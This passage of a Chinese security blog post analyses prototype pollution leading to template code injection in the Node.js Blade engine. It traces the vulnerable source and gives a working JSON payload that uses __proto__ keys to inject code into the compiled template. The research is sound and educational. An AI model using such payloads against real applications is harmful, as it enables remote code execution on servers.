+<h4 id="blade"><a href="#blade" class="headerlink" title="blade"></a>blade</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> data = <span class="title function_">unflatten</span>(req.<span class="property">body</span>);</span><br><span class="line">    <span class="keyword">const</span> template = <span class="string">`h1 Blade is cool`</span>;</span><br><span class="line">    blade.<span class="title function_">compile</span>(template, &#123;&#125;, <span class="keyword">function</span>(<span class="params">err, tmpl</span>) &#123;</span><br><span class="line">        <span class="title function_">tmpl</span>(data, <span class="keyword">function</span>(<span class="params">err, html</span>) &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(html)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>阅读模板解析源码，跟pug类似，也是先解析成AST再整合成匿名函数的方式，很多地方都加上了JSON.stringify的过滤，跟入_compileNode函数，当节点类型为tag时，存在一个没有过滤且可能可控的代码注入点：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(varAttrs.<span class="property">length</span> &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">_pushOff</span>(ns + <span class="string">&quot;.r.attrs(&#123;&quot;</span> + varAttrs.<span class="title function_">substr</span>(<span class="number">1</span>) + <span class="string">&quot;&#125;, &quot;</span> + ns + <span class="string">&quot;);&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>varAttrs来自前面的循环块，从attrs中获取，而attrs则从节点的attributes属性中获取，找到AST构建部分的parse_tag函数，节点的attributes由parse_attributes函数获得：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> tag = &#123;</span><br><span class="line">    <span class="string">&#x27;type&#x27;</span>: <span class="string">&quot;tag&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: tagName == <span class="string">&quot;&quot;</span> ? <span class="string">&quot;div&quot;</span> : tagName,</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: id_class.<span class="property">id</span>,</span><br><span class="line">    <span class="string">&#x27;classes&#x27;</span>: id_class.<span class="property">classes</span>,</span><br><span class="line">    <span class="string">&#x27;attributes&#x27;</span>: attrs == <span class="string">&quot;&quot;</span> ? &#123;&#125; : attrs,</span><br><span class="line">    <span class="string">&#x27;children&#x27;</span>: []</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>观摩一下parse_attributes函数，attrs的获取如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (result0 !== <span class="literal">null</span>) &#123;</span><br><span class="line">    result0 = (<span class="keyword">function</span>(<span class="params">offset, line, column, first_attr, next_attrs</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> attrs = &#123;&#125;;</span><br><span class="line">        attrs[first_attr.<span class="property">name</span>] = first_attr.<span class="property">value</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">in</span> next_attrs)</span><br><span class="line">            attrs[next_attrs[i].<span class="property">name</span>] = next_attrs[i].<span class="property">value</span>;</span><br><span class="line">        <span class="keyword">return</span> attrs;</span><br><span class="line">    &#125;)(pos0.<span class="property">offset</span>, pos0.<span class="property">line</span>, pos0.<span class="property">column</span>, result0[<span class="number">3</span>], result0[<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先要让result0不为null，但是阅读源码后发现该条件对模板有要求，要求模板中存在左括号相关的写法，随便修改一下模板：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> template = <span class="string">`h1( Blade is )cool`</span>;</span><br></pre></td></tr></table></figure>
+
+<p>观察attrs的获取方法，for in语法会访问原型属性，因此这一句代码会根据原型属性修改attrs：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attrs[next_attrs[i].<span class="property">name</span>] = next_attrs[i].<span class="property">value</span>;</span><br></pre></td></tr></table></figure>
+
+<p>如果构造失误导致了undefined数据，后面从attrs取出数据时就会发生错误，测试用的输入：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__.code&quot;</span><span class="punctuation">:</span> <span class="string">&quot;console.log(233)&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;__proto__.__proto__.name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Twings&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;__proto__.__proto__.value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Twings&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>此时会给varAttrs插入代码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">varAttrs += <span class="string">&quot;,&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(i) + <span class="string">&quot;:&#123;v:&quot;</span> + attrs[i].<span class="property">code</span> +</span><br><span class="line">    (attrs[i].<span class="property">escape</span> ? <span class="string">&quot;,e:1&quot;</span> : <span class="string">&quot;&quot;</span>) +</span><br><span class="line">    (i == <span class="string">&quot;class&quot;</span> &amp;&amp; attrs[i].<span class="property">append</span> ?</span><br><span class="line">        <span class="string">&quot;,a:&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(attrs[i].<span class="property">append</span>): <span class="string">&quot;&quot;</span>) + <span class="string">&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>此时的varAttrs如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;,\&quot;Twings\&quot;:&#123;v:console.log(233)&#125;,\&quot;code\&quot;:&#123;v:console.log(233)&#125;,\&quot;name\&quot;:&#123;v:console.log(233)&#125;,\&quot;value\&quot;:&#123;v:console.log(233)&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到代码被注入且正常执行了。</p>
+<hr>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://xz.aliyun.com/t/12635">一文带你理解AST Injection</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/NodeJS/">NodeJS</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">原型链污染</a>
+                    
+                      <a class="hover-with-bg" href="/tags/JavaScript/">JavaScript</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2023/07/22/Spring%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>Spring反序列化漏洞</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2023/06/29/Go-SSTI/">
+                        <span>Go SSTI</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
+<script  src="/js/main.js" ></script>
+
+
+  <script  src="/js/lazyload.js" ></script>
+
+
+
+  
+  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "原型链污染注入HTML模板&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
